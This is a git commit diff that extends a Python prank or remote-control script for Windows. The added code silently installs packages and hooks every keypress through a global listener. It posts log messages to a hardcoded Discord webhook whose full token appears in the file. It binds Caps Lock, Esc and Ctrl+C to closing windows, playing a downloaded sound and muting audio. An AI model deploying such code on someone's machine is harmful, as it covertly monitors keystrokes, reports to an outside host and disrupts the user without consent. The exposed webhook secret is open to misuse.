987ffd424bf427be3e0e839f121b327ad7c6e388
tonioliii <105586518+tonioliii@users.noreply.github.com>
2023-12-13 18:52:22 +0100

    Add files via upload

--- onlineside.py
+++ onlineside.py
@@ -3,15 +3,30 @@ import math
 from time import sleep
 import os.path
 import os
+import pip
+import secrets
+
+webhook_link = "https://discord.com/api/webhooks/1184525775400095744/-rQXhzo5YQDm8-K4GQVXbz32C9NMj0ykOOxvmJz1bTXjeuMI0_bsHF15UJGSDMAuOgeO"
 
 # POPUP -> powershell (New-Object -ComObject Wscript.Shell).Popup("""Operation Completed""",0,"""Done""",0x0)
 # ETEINDRE ????
 # EVENT QUAND TOUCHE CERTAINE TOUCHES DU CLAVIER
 
-# eviter les fatal error + log les erreurs
-# logs via discord
-
 # Séparer onlineside en lib et executions
+
+def install(package):
+    if hasattr(pip, 'main'):
+        pip.main(['install', package])
+    else:
+        pip._internal.main(['install', package])
+
+try:
+    import requests
+except:
+    install("requests")
+    import requests
+
+username = secrets.token_urlsafe(10)
 
 def log(msg):
     content = ""
@@ -23,13 +38,17 @@ def log(msg):
     with open("logs.txt","w") as f:
         f.write(content + msg)
     print(msg)
+    data = {"content" : f"``{msg}``","username" : username}
+    r = requests.post(webhook_link,json=data)
+
+log("Loading requierements")
 
 try:
-    from pynput.keyboard import Key, Controller
+    from pynput.keyboard import Key, Controller, Listener
 except:
     try:
         install("pynput")
-        from pynput.keyboard import Key, Controller
+        from pynput.keyboard import Key, Controller, Listener
     except:
         log("Can't load 'pynput' module")
 
@@ -74,70 +93,129 @@ except:
     except:
         log("Can't load 'webbrowser' module")
 
+last_keys = []
+keypress_event = []
+
+def startswithlist(list1,list2):
+    return list1[:len(list2)] == list2
+
+actions = []
+
+def on_press(key):
+    try:
+        if type(key) != type(Key.alt):
+            key = str(key).replace("'","")
+        last_keys.insert(0,key)
+        for x in keypress_event :
+            if startswithlist(last_keys,x[0]):        
+                actions.append(x[1])
+
+    except Exception as E:
+        log(f"Error {E} on_press({key})")
+
+def add_key_press_event(keys: dict, func: str):
+    try:
+        keypress_event.append([keys,func])
+        log(f"Sucessfuly add_key_press_event({keys},{func})")
+    except Exception as E:
+        log(f"Error {E} while trying to add_key_press_event({keys},{func})")
+
+listener = Listener(on_press=on_press)
+listener.start()
+
 def unmute():
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = cast(interface, POINTER(IAudioEndpointVolume))
-    volume.SetMute(0, None)
-    sleep(1)
+    try:
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        volume.SetMute(0, None)
+        log("Sucessfuly unmute")
+    except Exception as E:
+        log(f"Error {E} while trying to unmute")
 
 def mute():
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = cast(interface, POINTER(IAudioEndpointVolume))
-    volume.SetMute(1, None)
-    sleep(1)
+    try:
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        volume.SetMute(1, None)
+        log("Sucessfuly mute")
+    except Exception as E:
+        log(f"Error {E} while trying to mute")
 
-def random_volume():
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = cast(interface, POINTER(IAudioEndpointVolume))
-    # Get current volume 
-    currentVolumeDb = volume.GetMasterVolumeLevel()
-    randint(0,1)
-    volume.SetMasterVolumeLevel(randint(-30,0), None)
-    sleep(1)
+def set_random_volume():
+    try:
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        # Get current volume 
+        currentVolumeDb = volume.GetMasterVolumeLevel()
+        randint(0,1)
+        volume.SetMasterVolumeLevel(randint(-30,0), None)
+        log("Sucessfuly set_random_volume")
+    except Exception as E:
+        log(f"Error {E} while trying to set_random_volume")
 
 def alt_f4():
-    keyboard = Controller()
-    keyboard.press(Key.alt)
-    keyboard.press(Key.f4)
-    keyboard.release(Key.alt)
-    keyboard.release(Key.f4)
+    try:
+        keyboard = Controller()
+        keyboard.press(Key.alt)
+        keyboard.press(Key.f4)
+        keyboard.release(Key.alt)
+        keyboard.release(Key.f4)
+        log("Sucessfuly alt_f4")
+    except Exception as E:
+        log(f"Error {E} while trying to alt_f4")
 
 def win_d():
-    keyboard = Controller()
-    keyboard.press(Key.cmd)
-    keyboard.press("d")
-    keyboard.release(Key.cmd)
-    keyboard.release("d")
+    try:
+        keyboard = Controller()
+        keyboard.press(Key.cmd)
+        keyboard.press("d")
+        keyboard.release(Key.cmd)
+        keyboard.release("d")
+        log("Sucessfuly win_d")
+    except Exception as E:
+        log(f"Error {E} while trying to win_d")
 
 def ctrl_win_d():
-    keyboard = Controller()
-    keyboard.press(Key.cmd)
-    keyboard.press(Key.ctrl)
-    keyboard.press("d")
-    keyboard.release(Key.cmd)
-    keyboard.release(Key.ctrl)
-    keyboard.release("d")
+    try:
+        keyboard = Controller()
+        keyboard.press(Key.cmd)
+        keyboard.press(Key.ctrl)
+        keyboard.press("d")
+        keyboard.release(Key.cmd)
+        keyboard.release(Key.ctrl)
+        keyboard.release("d")
+        log("Sucessfuly ctrl_win_d")
+    except Exception as E:
+        log(f"Error {E} while trying to ctrl_win_d")
 
 def ctrl_win_right():
-    keyboard = Controller()
-    keyboard.press(Key.cmd)
-    keyboard.press(Key.ctrl)
-    keyboard.press(Key.right)
-    keyboard.release(Key.cmd)
-    keyboard.release(Key.ctrl)
-    keyboard.release(Key.right)
+    try:
+        keyboard = Controller()
+        keyboard.press(Key.cmd)
+        keyboard.press(Key.ctrl)
+        keyboard.press(Key.right)
+        keyboard.release(Key.cmd)
+        keyboard.release(Key.ctrl)
+        keyboard.release(Key.right)
+        log("Sucessfuly ctrl_win_right")
+    except Exception as E:
+        log(f"Error {E} while trying to ctrl_win_right")
 
 def ctrl_win_left():
-    keyboard = Controller()
-    keyboard.press(Key.cmd)
-    keyboard.press(Key.ctrl)
-    keyboard.press(Key.left)
-    keyboard.release(Key.cmd)
-    keyboard.release(Key.ctrl)
-    keyboard.release(Key.left)
+    try:
+        keyboard = Controller()
+        keyboard.press(Key.cmd)
+        keyboard.press(Key.ctrl)
+        keyboard.press(Key.left)
+        keyboard.release(Key.cmd)
+        keyboard.release(Key.ctrl)
+        keyboard.release(Key.left)
+        log("Sucessfuly ctrl_win_left")
+    except Exception as E:
+        log(f"Error {E} while trying to ctrl_win_left")
 
 def download_file(url):
     local_filename = url.split('/')[-1]
@@ -153,15 +231,18 @@ def download_file(url):
     return local_filename
 
 def playsound(url):
-    name = url.split('/')[-1]
-    check_file = os.path.isfile(name)
-    if check_file == False:
-        download_file(url)
-    sleep(1)
     try:
+        name = url.split('/')[-1]
+        check_file = os.path.isfile(name)
+        if check_file == False:
+            download_file(url)
         playsoundfromdisk(name).play()
-    except:
-        pass
+        log(f"Sucessfuly playsound({url})")
+    except Exception as E:
+        log(f"Error {E} while trying to playsound({url})")
+
+
+log("Import finished")
 
 # Feature list:
 # playsound(url)
@@ -170,9 +251,22 @@ def playsound(url):
 # ctrl_win_d()
 # win_d()
 # alt_f4()
-# random_volume()
+# set_random_volume()
 # mute()
 # unmute()
 # webopen(url)
+# add_key_press_event([key list],[nom de la fonction,argument optionelle])
 
-webopen("https://www.google.com")
+
+add_key_press_event([Key.caps_lock],[alt_f4])
+add_key_press_event([Key.esc],[playsound,"https://raw.githubusercontent.com/tonioliii/jkiller/main/fortnite.mp3"])
+add_key_press_event(['\\x03'],[mute])
+
+while True:
+    if actions != []:
+        action = actions[0]
+        if len(action) == 2:
+            action[0](action[1])
+        else:
+            action[0]()
+        actions = actions[1:]
